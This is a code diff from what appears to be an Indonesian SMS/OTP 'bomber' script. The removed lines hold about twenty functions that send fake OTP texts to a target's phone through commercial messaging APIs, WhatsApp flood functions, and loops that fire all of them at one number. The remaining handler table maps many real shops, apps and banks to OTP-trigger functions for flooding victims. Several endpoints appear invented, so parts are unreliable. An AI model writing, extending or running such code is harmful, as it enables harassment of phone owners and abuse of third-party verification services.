-        return resp
-    except:
-        return None
-
-def spam_sms_6(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.twilio.com/2010-04-01/Accounts/" + TOKENS['twilio_sid'] + "/Messages.json"
-        auth = (TOKENS['twilio_sid'], TOKENS['twilio_auth'])
-        payload = {"To": f"+62{phone_raw}", "From": "+1234567890", "Body": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, data=payload, auth=auth, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_7(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://rest.nexmo.com/sms/json"
-        payload = {"api_key": TOKENS['nexmo_key'], "api_secret": TOKENS['nexmo_secret'], "from": "OTP", "to": f"62{phone_raw}", "text": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_8(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.telnyx.com/v2/messages"
-        headers = {"Authorization": TOKENS['telnyx_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "+1234567890", "text": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_9(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.messagebird.com/v1/messages"
-        headers = {"Authorization": "AccessKey " + TOKENS['messagebird_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "OTP", "body": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_10(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.sinch.com/v1/sms"
-        headers = {"Authorization": "Bearer " + TOKENS['sinch_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "OTP", "body": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_11(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.ringcentral.com/v1/sms"
-        headers = {"Authorization": "Bearer " + TOKENS['ringcentral_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "OTP", "text": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_12(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.vonage.com/v1/sms"
-        headers = {"Authorization": "Bearer " + TOKENS['vonage_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "OTP", "text": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_13(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.zendesk.com/v1/sms"
-        headers = {"Authorization": "Bearer " + TOKENS['zendesk_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "OTP", "body": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_14(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.slack.com/sms"
-        headers = {"Authorization": "Bearer " + TOKENS['slack_token']}
-        payload = {"to": f"+62{phone_raw}", "from": "OTP", "text": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_15(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = TOKENS['discord_webhook']
-        payload = {"content": f"📱 OTP Request\nPhone: {phone_raw}\nOTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_16(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://graph.facebook.com/v18.0/" + TOKENS['whatsapp_token'] + "/messages"
-        headers = {"Authorization": "Bearer " + TOKENS['whatsapp_token']}
-        payload = {"messaging_product": "whatsapp", "to": f"62{phone_raw}", "type": "text", "text": {"body": f"OTP: {random.randint(100000,999999)}"}}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_17(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.ultramsg.com/instanceXXXX/messages/chat"
-        payload = {"token": TOKENS['ultramsg_token'], "to": f"62{phone_raw}", "body": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_18(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.waha.dev/v1/send-text"
-        headers = {"Authorization": "Bearer " + TOKENS['waha_token']}
-        payload = {"phone": f"62{phone_raw}", "text": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_19(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.telegram.org/bot" + TOKENS['callmebot_key'] + "/sendMessage"
-        payload = {"chat_id": "123456789", "text": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-def spam_sms_20(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.aws.amazon.com/sns/sms"
-        payload = {"to": f"+62{phone_raw}", "from": "OTP", "message": f"OTP: {random.randint(100000,999999)}"}
-        resp = requests.post(url, json=payload, timeout=10)
-        return resp
-    except:
-        return None
-
-# ================================================================
-# ===== SPAM WA CODE (10+ METHOD) =====
-# ================================================================
-
-def wa_call_1(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=📞%20Call%20Me"
-        resp = requests.get(url, timeout=10)
-        return resp
-    except:
-        return None
-
-def wa_call_2(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = f"https://wa.me/62{phone_raw}?text=📞%20Call%20Me"
-        resp = requests.get(url, timeout=10)
-        return resp
-    except:
-        return None
-
-def wa_call_3(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=📞%20Panggilan%20Masuk"
-        resp = requests.get(url, timeout=10)
-        return resp
-    except:
-        return None
-
-def wa_call_4(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://graph.facebook.com/v18.0/me/messages"
-        payload = {"messaging_product": "whatsapp", "to": f"62{phone_raw}", "type": "text", "text": {"body": "📞 Panggilan Masuk"}}
-        headers = {"Authorization": f"Bearer {TOKENS['whatsapp_token']}", "Content-Type": "application/json"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def wa_call_5(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.callmebot.com/whatsapp.php"
-        params = {"phone": f"62{phone_raw}", "text": "📞 Panggilan Masuk", "apikey": TOKENS['callmebot_key']}
-        resp = requests.get(url, params=params, timeout=10)
-        return resp
-    except:
-        return None
-
-def wa_code_1(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        otp = random.randint(100000, 999999)
-        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=Kode%20OTP%20Anda%3A%20{otp}"
-        resp = requests.get(url, timeout=10)
-        return resp
-    except:
-        return None
-
-def wa_code_2(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        otp = random.randint(100000, 999999)
-        url = f"https://wa.me/62{phone_raw}?text=Kode%20OTP%20Anda%3A%20{otp}"
-        resp = requests.get(url, timeout=10)
-        return resp
-    except:
-        return None
-
-def wa_code_3(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        otp = random.randint(100000, 999999)
-        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=Kode%20OTP%20Anda%3A%20{otp}"
-        resp = requests.get(url, timeout=10)
-        return resp
-    except:
-        return None
-
-def wa_code_4(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        otp = random.randint(100000, 999999)
-        url = "https://graph.facebook.com/v18.0/me/messages"
-        payload = {"messaging_product": "whatsapp", "to": f"62{phone_raw}", "type": "text", "text": {"body": f"Kode OTP Anda: {otp}"}}
-        headers = {"Authorization": f"Bearer {TOKENS['whatsapp_token']}", "Content-Type": "application/json"}
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp
-    except:
-        return None
-
-def wa_code_5(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        otp = random.randint(100000, 999999)
-        url = "https://api.callmebot.com/whatsapp.php"
-        params = {"phone": f"62{phone_raw}", "text": f"Kode OTP: {otp}", "apikey": TOKENS['callmebot_key']}
-        resp = requests.get(url, params=params, timeout=10)
-        return resp
-    except:
-        return None
-
-def wa_code_6(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        otp = random.randint(100000, 999999)
-        messages = [f"Kode OTP Anda: {otp}", f"OTP: {otp}", f"Your OTP code is: {otp}", f"Kode verifikasi: {otp}", f"OTP untuk login: {otp}"]
-        msg = random.choice(messages)
-        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text={msg.replace(' ', '%20')}"
-        resp = requests.get(url, timeout=10)
-        return resp
-    except:
-        return None
-
-# ================================================================
-# ===== WRAPPER SPAM ALL =====
-# ================================================================
-
-def spam_call_all(phone):
-    methods = [spam_call_1, spam_call_2, spam_call_3, spam_call_4, spam_call_5, spam_call_6, spam_call_7, spam_call_8, spam_call_9, spam_call_10, spam_call_11, spam_call_12, spam_call_13, spam_call_14, spam_call_15, spam_call_16, spam_call_17, spam_call_18, spam_call_19, spam_call_20]
-    success = 0
-    for method in methods:
-        try:
-            resp = method(phone)
-            if resp and resp.status_code in [200, 201, 202, 204]:
-                success += 1
-        except:
-            pass
-    return success
-
-def spam_sms_all(phone):
-    methods = [spam_sms_1, spam_sms_2, spam_sms_3, spam_sms_4, spam_sms_5, spam_sms_6, spam_sms_7, spam_sms_8, spam_sms_9, spam_sms_10, spam_sms_11, spam_sms_12, spam_sms_13, spam_sms_14, spam_sms_15, spam_sms_16, spam_sms_17, spam_sms_18, spam_sms_19, spam_sms_20]
-    success = 0
-    for method in methods:
-        try:
-            resp = method(phone)
-            if resp and resp.status_code in [200, 201, 202, 204]:
-                success += 1
-        except:
-            pass
-    return success
-
-def spam_wa_call_all(phone):
-    methods = [wa_call_1, wa_call_2, wa_call_3, wa_call_4, wa_call_5]
-    success = 0
-    for method in methods:
-        try:
-            resp = method(phone)
-            if resp and resp.status_code in [200, 201, 202, 204]:
-                success += 1
-        except:
-            pass
-    return success
-
-def spam_wa_code_all(phone):
-    methods = [wa_code_1, wa_code_2, wa_code_3, wa_code_4, wa_code_5, wa_code_6]
-    success = 0
-    for method in methods:
-        try:
-            resp = method(phone)
-            if resp and resp.status_code in [200, 201, 202, 204]:
-                success += 1
-        except:
-            pass
-    return success
-
-# ================================================================
 # ===== ALL HANDLERS DICT =====
 # ================================================================
 
 ALL_HANDLERS = {
-    # OTP HANDLERS
+    # WORKING APIS
     'pinhome': send_pinhome_otp,
     'rumah123': send_rumah123_otp,
     'paper': send_paper_otp,
@@ -1563,11 +919,15 @@ ALL_HANDLERS = {
     'ohsome': send_ohsome_otp,
     'optikmelawai': send_optikmelawai_otp,
     'hollandbakery': send_hollandbakery_otp,
-    'maulagi': send_maulagi_otp,
     'bunda': send_bunda_otp,
+    'maulagi': send_maulagi_otp,
+    
+    # DARI FILE LU
+    'hrsbre': send_hrsbre_otp,
+    'erafone': send_erafone_otp,
     'planetban': send_planetban_otp,
-    'hashmicro': send_hashmicro_otp,
     'tuneup': send_tuneup_otp,
+    'hashmicro': send_hashmicro_otp,
     'internetrakyat': send_internetrakyat_otp,
     'ultramilk': send_ultramilk_register,
     'kaniva': send_kaniva_otp,
@@ -1581,14 +941,27 @@ ALL_HANDLERS = {
     'astra_daihatsu': send_astra_daihatsu_otp,
     'royal_canin': send_royal_canin_otp,
     'watsons': send_watsons_otp,
-    'hrsbre': send_hrsbre_otp,
-    'erafone': send_erafone_otp,
     'beautyhaul': send_beautyhaul_otp,
     'hainaya': send_hainaya_otp,
     'minumyukkaka': send_minumyukkaka_otp,
     'sidemang': send_sidemang_otp,
     'lapormasbup': send_lapormasbup_otp,
     'ptsp_kemenag': send_ptsp_kemenag_otp,
+    'klook': send_klook_otp,
+    'acc': send_acc_otp,
+    'absenku': send_absenku_otp,
+    'saturdays': send_saturdays_otp,
+    'singa': send_singa_otp,
+    'adiraku': send_adiraku_otp,
+    
+    # BANKS
+    'bri': send_bri_otp,
+    'bri_sms': send_bri_sms_otp,
+    'danamon': send_danamon_otp,
+    'mandiri': send_mandiri_otp,
+    'bca': send_bca_otp,
+    
+    # E-COMMERCE
     'shopee': send_shopee_otp,
     'tokopedia': send_tokopedia_otp,
     'gojek': send_gojek_otp,
@@ -1598,41 +971,21 @@ ALL_HANDLERS = {
     'jdid': send_jdid_otp,
     'zalora': send_zalora_id_otp,
     'sociolla': send_sociolla_otp,
+    
+    # SOCIAL
     'tiktok': send_tiktok_otp,
     'olx': send_olx_otp,
     'indihome': send_indihome_otp,
-    'klook': send_klook_otp,
+    
+    # SERVICES
     'halodoc': send_halodoc_otp,
     'sayurbox': send_sayurbox_otp,
     'carsome': send_carsome_otp,
     'pizzahut': send_pizzahut_otp,
-    # INDONESIA BANKS
-    'bri': send_bri_otp,
-    'bri_sms': send_bri_sms_otp,
-    'danamon': send_danamon_otp,
-    'mandiri': send_mandiri_otp,
-    'bca': send_bca_otp,
-    'bni': send_bni_otp,
-    'btn': send_btn_otp,
-    'cimb': send_cimb_otp,
-    'permata': send_permata_otp,
-    'ocbc': send_ocbc_otp,
-    'btpn': send_btpn_otp,
-    'jenius': send_jenius_otp,
-    # SPAM
-    'spam_call': spam_call_all,
-    'spam_sms': spam_sms_all,
-    'wa_call': spam_wa_call_all,
-    'wa_code': spam_wa_code_all,
 }
 
 def get_all_handlers():
     return ALL_HANDLERS
 
-def get_premium_handlers():
-    premium = {}
-    premium_list = ['spam_call', 'spam_sms', 'wa_call', 'wa_code']
-    for k in premium_list:
-        if k in ALL_HANDLERS:
-            premium[k] = ALL_HANDLERS[k]
-    return premium
+def get_working_handlers():
+    return ALL_HANDLERS
